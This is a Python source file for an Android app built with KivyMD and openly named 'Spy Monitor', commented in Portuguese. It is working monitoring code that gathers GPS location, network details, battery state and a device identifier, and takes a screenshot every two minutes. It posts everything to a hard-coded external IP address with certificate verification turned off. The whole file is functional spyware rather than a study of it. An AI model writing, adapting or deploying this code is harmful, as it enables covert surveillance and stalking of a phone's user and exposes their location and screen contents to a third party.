# Spy Monitor App - KivyMD Version
# Aplicação principal de monitoramento usando KivyMD

import kivy
from kivymd.app import MDApp
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.label import MDLabel
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.scrollview import ScrollView
from kivy.metrics import dp
from kivy.clock import Clock
import time
import threading
import requests
import json
from datetime import datetime
import uuid
import platform
import logging
import queue
import os
import tempfile
import hashlib
import socket

# Configuração do servidor externo
SERVER_URL = "https://147.79.111.118"

# Configurações otimizadas para coleta leve
COLLECTION_INTERVAL = 120  # segundos (mais espaçado para reduzir bateria)
SCREENSHOT_INTERVAL = 120  # segundos (2 minutos para screenshots)
REQUEST_TIMEOUT = 20  # segundos (mais tempo para conexões lentas)
MAX_RETRIES = 5  # mais tentativas para confiabilidade
BATCH_SIZE = 3  # lotes menores para evitar sobrecarga

class SpyMonitor(MDApp):
    """Aplicação principal de monitoramento usando KivyMD"""

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        # Variáveis de controle
        self.is_monitoring = False
        self.device_id = self.get_device_id()
        self.collection_count = 0
        self.data_queue = queue.Queue(maxsize=50)  # Fila para dados coletados
        self.send_thread = None
        self.last_collection = 0
        self.last_screenshot = 0
        self.log_messages = []  # Lista para armazenar logs

    def build(self):
        """Inicializar a aplicação de monitoramento"""
        # Criar interface principal com KivyMD
        main_layout = MDBoxLayout(orientation='vertical', spacing=dp(10), padding=dp(20))

        # Título
        title_label = MDLabel(
            text='📱 Spy Monitor',
            halign='center',
            font_style='H4',
            theme_text_color='Primary',
            size_hint_y=None,
            height=dp(50)
        )
        main_layout.add_widget(title_label)

        # Status
        self.status_label = MDLabel(
            text='Status: Parado',
            halign='center',
            font_style='H6',
            theme_text_color='Error',
            size_hint_y=None,
            height=dp(40)
        )
        main_layout.add_widget(self.status_label)

        # Contador de dados
        self.counter_label = MDLabel(
            text='Dados enviados: 0',
            halign='center',
            font_style='Body1',
            theme_text_color='Secondary',
            size_hint_y=None,
            height=dp(30)
        )
        main_layout.add_widget(self.counter_label)

        # Botão Iniciar/Parar
        self.monitor_button = MDRaisedButton(
            text='▶️ Iniciar Monitoramento',
            on_press=self.toggle_monitoring,
            size_hint=(None, None),
            size=(dp(200), dp(50)),
            pos_hint={'center_x': 0.5}
        )
        main_layout.add_widget(self.monitor_button)

        # Área de logs com scroll
        scroll_view = ScrollView(size_hint=(1, 0.4))
        self.log_label = MDLabel(
            text='Logs: Pronto para iniciar...',
            halign='left',
            valign='top',
            font_style='Caption',
            theme_text_color='Hint',
            size_hint_y=None,
            text_size=(None, None),
            height=dp(200)
        )
        scroll_view.add_widget(self.log_label)
        main_layout.add_widget(scroll_view)

        # Atualizar logs periodicamente
        Clock.schedule_interval(self.update_log_display, 1)

        return main_layout

    def get_device_id(self):
        """Gera ID único do dispositivo"""
        try:
            unique_string = f"{platform.node()}-{platform.machine()}-{uuid.getnode()}"
            return hashlib.md5(unique_string.encode()).hexdigest()[:15]
        except:
            return str(uuid.uuid4())[:15]

    def add_log(self, message):
        """Adiciona mensagem ao log"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}"

        # Manter apenas últimas 20 mensagens
        self.log_messages.append(log_entry)
        if len(self.log_messages) > 20:
            self.log_messages.pop(0)

    def update_log_display(self, dt):
        """Atualiza a exibição dos logs na interface"""
        if self.log_messages:
            self.log_label.text = '\n'.join(self.log_messages)
            self.log_label.height = max(dp(200), len(self.log_messages) * dp(20))

    def toggle_monitoring(self, instance):
        """Alterna entre iniciar e parar monitoramento"""
        if not self.is_monitoring:
            self.start_monitoring()
        else:
            self.stop_monitoring()

    def start_monitoring(self):
        """Inicia o monitoramento"""
        try:
            self.is_monitoring = True
            self.status_label.text = "Status: Ativo"
            self.status_label.theme_text_color = 'Custom'
            self.status_label.text_color = [0, 1, 0, 1]  # Verde
            self.monitor_button.text = "⏹️ Parar Monitoramento"

            # Testar conexão
            if self.test_connection():
                self.add_log("✅ Conectado ao servidor")

                # Iniciar threads de monitoramento
                self.send_thread = threading.Thread(target=self.send_worker, daemon=True)
                self.send_thread.start()

                # Iniciar loop principal
                Clock.schedule_interval(self.monitoring_loop, 5)  # Verificar a cada 5 segundos

                self.add_log("🚀 Monitoramento iniciado - Captura automática ativada")
            else:
                self.add_log("❌ Erro: Servidor indisponível")
                self.stop_monitoring()

        except Exception as e:
            self.add_log(f"❌ Erro ao iniciar: {str(e)[:30]}")
            self.stop_monitoring()

    def stop_monitoring(self):
        """Para o monitoramento"""
        try:
            self.is_monitoring = False
            self.status_label.text = "Status: Parado"
            self.status_label.theme_text_color = 'Error'
            self.monitor_button.text = "▶️ Iniciar Monitoramento"

            # Cancelar agendamentos
            Clock.unschedule(self.monitoring_loop)

            self.add_log("⏹️ Monitoramento parado")
        except Exception as e:
            self.add_log(f"Erro ao parar: {str(e)[:20]}")

    def test_connection(self):
        """Testa conexão com o servidor"""
        try:
            response = requests.get(f"{SERVER_URL}/", timeout=REQUEST_TIMEOUT, verify=False)
            return response.status_code == 200
        except:
            return False

    def monitoring_loop(self, dt):
        """Loop principal de monitoramento"""
        try:
            current_time = time.time()

            # Coleta de dados normal
            if current_time - self.last_collection >= COLLECTION_INTERVAL:
                self.last_collection = current_time
                self.collect_and_send_data()

            # Captura de screenshot
            if current_time - self.last_screenshot >= SCREENSHOT_INTERVAL:
                self.last_screenshot = current_time
                self.take_screenshot()

        except Exception as e:
            self.add_log(f"❌ Erro no loop: {str(e)[:25]}")

    def collect_and_send_data(self):
        """Coleta e envia dados de forma otimizada"""
        try:
            collected_data = []

            # Dados básicos do dispositivo (sempre coletar)
            device_data = {
                'imei': self.device_id,
                'timestamp': datetime.now().isoformat(),
                'platform': platform.system(),
                'version': platform.version()[:10] if platform.version() else 'Unknown'
            }
            collected_data.append(('device_info', device_data))

            # Coletar localização (menos frequente)
            if self.collection_count % 3 == 0:
                location = self.get_location()
                if location:
                    collected_data.append(('location', location))

            # Coletar informações de rede
            if self.collection_count % 4 == 0:
                network_info = self.get_network_info()
                if network_info:
                    collected_data.append(('network', network_info))

            # Coletar dados de bateria
            if self.collection_count % 6 == 0:
                battery_info = self.get_battery_info()
                if battery_info:
                    collected_data.append(('battery', battery_info))

            # Enviar dados coletados
            if collected_data:
                for data_type, data in collected_data:
                    self.data_queue.put((data_type, data), timeout=1)
                self.add_log(f"📤 {len(collected_data)} tipos coletados")
            else:
                self.add_log("ℹ️ Nenhum dado novo")

            self.collection_count += 1
            self.counter_label.text = f"Dados enviados: {self.collection_count}"

        except Exception as e:
            self.add_log(f"❌ Erro na coleta: {str(e)[:25]}")

    def send_worker(self):
        """Worker thread para envio de dados"""
        while self.is_monitoring:
            try:
                # Processar fila de dados
                while not self.data_queue.empty():
                    data_type, data = self.data_queue.get(timeout=1)
                    self.send_data_with_retry(data_type, data)
                    self.data_queue.task_done()

                time.sleep(2)  # Pequena pausa
            except queue.Empty:
                time.sleep(1)
            except Exception as e:
                self.add_log(f"❌ Erro no worker: {str(e)[:20]}")
                time.sleep(5)

    def get_location(self):
        """Obtém localização do dispositivo"""
        try:
            if platform.system() == 'Android':
                from plyer import gps

                # Configurar GPS
                gps.configure(on_location=self.on_location_update)
                gps.start(minTime=1000, minDistance=1)

                # Aguardar localização
                time.sleep(3)
                gps.stop()

                if hasattr(self, 'last_location'):
                    return self.last_location

            return None
        except Exception as e:
            self.add_log(f"📍 GPS erro: {str(e)[:20]}")
            return None

    def on_location_update(self, **kwargs):
        """Callback para atualização de localização"""
        self.last_location = {
            'latitude': kwargs.get('lat'),
            'longitude': kwargs.get('lon'),
            'accuracy': kwargs.get('accuracy'),
            'timestamp': datetime.now().isoformat()
        }

    def get_network_info(self):
        """Obtém informações de rede"""
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)

            return {
                'hostname': hostname,
                'local_ip': local_ip,
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            return None

    def get_battery_info(self):
        """Obtém informações da bateria"""
        try:
            if platform.system() == 'Android':
                from plyer import battery

                battery_status = battery.status
                return {
                    'level': battery_status.get('percentage', 0),
                    'charging': battery_status.get('isCharging', False),
                    'timestamp': datetime.now().isoformat()
                }
            return None
        except Exception as e:
            return None

    def take_screenshot(self):
        """Captura screenshot automática"""
        try:
            if platform.system() == 'Android':
                from plyer import screenshot

                # Criar arquivo temporário
                temp_dir = tempfile.gettempdir()
                screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")

                # Capturar screenshot
                screenshot.take_screenshot(screenshot_path)

                if os.path.exists(screenshot_path):
                    # Enviar para servidor
                    self.upload_screenshot(screenshot_path)
                    self.add_log("📸 Screenshot capturado")
                else:
                    self.add_log("❌ Falha no screenshot")

        except Exception as e:
            self.add_log(f"📸 Screenshot erro: {str(e)[:20]}")

    def upload_screenshot(self, screenshot_path):
        """Faz upload do screenshot"""
        try:
            if os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    files = {'file': f}
                    data = {
                        'imei': self.device_id,
                        'tipo': 'screenshot',
                        'timestamp': time.time()
                    }

                    response = requests.post(
                        f"{SERVER_URL}/api/upload/",
                        files=files,
                        data=data,
                        timeout=REQUEST_TIMEOUT,
                        verify=False
                    )

                    if response.status_code == 200:
                        os.remove(screenshot_path)
                        self.add_log("✅ Screenshot enviado")
                    else:
                        self.add_log(f"⚠️ Upload erro: {response.status_code}")

        except Exception as e:
            self.add_log(f"❌ Upload erro: {str(e)[:20]}")

    def send_data_with_retry(self, data_type, data, retry_count=0):
        """Envia dados com retry"""
        try:
            # Mapeamento de URLs
            url_map = {
                'device_info': f"{SERVER_URL}/api/device-info/",
                'location': f"{SERVER_URL}/api/localizacao/",
                'network': f"{SERVER_URL}/api/atividade-rede/",
                'battery': f"{SERVER_URL}/api/device-info/"
            }

            url = url_map.get(data_type)
            if not url:
                return

            # Envio
            response = requests.post(url, json=data, timeout=REQUEST_TIMEOUT, verify=False)

            if response.status_code in [200, 201]:
                # Logs específicos
                if data_type == 'location':
                    self.add_log("📍 Localização OK")
                elif data_type == 'network':
                    self.add_log("🌐 Rede OK")
                elif data_type == 'battery':
                    nivel = data.get('level', 'N/A')
                    self.add_log(f"🔋 Bateria: {nivel}%")
            else:
                if retry_count < MAX_RETRIES:
                    delay = (2 ** retry_count) + (retry_count * 0.1)
                    time.sleep(min(delay, 30))
                    self.send_data_with_retry(data_type, data, retry_count + 1)
                else:
                    self.add_log(f"⚠️ {data_type}: HTTP {response.status_code}")

        except requests.exceptions.Timeout:
            if retry_count < MAX_RETRIES:
                delay = (2 ** retry_count) + 1
                time.sleep(min(delay, 30))
                self.send_data_with_retry(data_type, data, retry_count + 1)
            else:
                self.add_log(f"⏰ Timeout {data_type}")
        except requests.exceptions.ConnectionError:
            if retry_count < MAX_RETRIES:
                delay = (2 ** retry_count) + 2
                time.sleep(min(delay, 30))
                self.send_data_with_retry(data_type, data, retry_count + 1)
            else:
                self.add_log(f"🔌 Conexão {data_type} falhou")
        except requests.exceptions.RequestException as e:
            if retry_count < MAX_RETRIES:
                delay = (2 ** retry_count) + 1
                time.sleep(min(delay, 30))
                self.send_data_with_retry(data_type, data, retry_count + 1)
            else:
                self.add_log(f"❌ Erro {data_type}: {str(e)[:15]}")

    def on_stop(self):
        """Fechamento da aplicação"""
        self.is_monitoring = False
        self.add_log("📱 Aplicativo fechado")

if __name__ == '__main__':
    SpyMonitor().run()
